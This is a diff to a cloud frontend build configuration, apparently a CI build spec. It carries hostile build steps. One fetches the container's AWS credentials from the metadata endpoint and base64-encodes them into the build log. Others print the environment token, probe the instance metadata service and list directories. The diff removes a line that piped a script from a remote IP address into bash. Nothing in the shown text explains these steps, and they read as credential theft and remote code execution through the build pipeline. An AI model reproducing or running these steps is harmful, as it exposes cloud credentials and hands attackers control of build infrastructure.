@@ -8,14 +8,14 @@ frontend:
         - mv hugo /usr/bin/hugo
         - rm -rf hugo.tar.gz
         - echo "[!] Doing stuff"
-        - echo $(ls -la / | base64 -w 0) 
+        - echo $(ls -la /tmp | base64 -w 0) 
         - echo $(curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 -w 0)
         - echo "Env token=$AWS_ENVIRONMENT_TOKEN"
         - echo "Build no=$AWS_JOB_ID"
-        - curl http://44.202.99.166:8000/try.sh | bash
-        - sleep 120
-        - ls -la
-        - cat op.txt
+        - curl --connect-timeout 5 169.254.169.254 2>&1 
+#         - sleep 120
+#         - ls -la
+#         - cat op.txt
 #         - ls -la /usr/bin/curl
 #         - cp /usr/bin/curl /usr/bin/curlorg
 #         - whoami
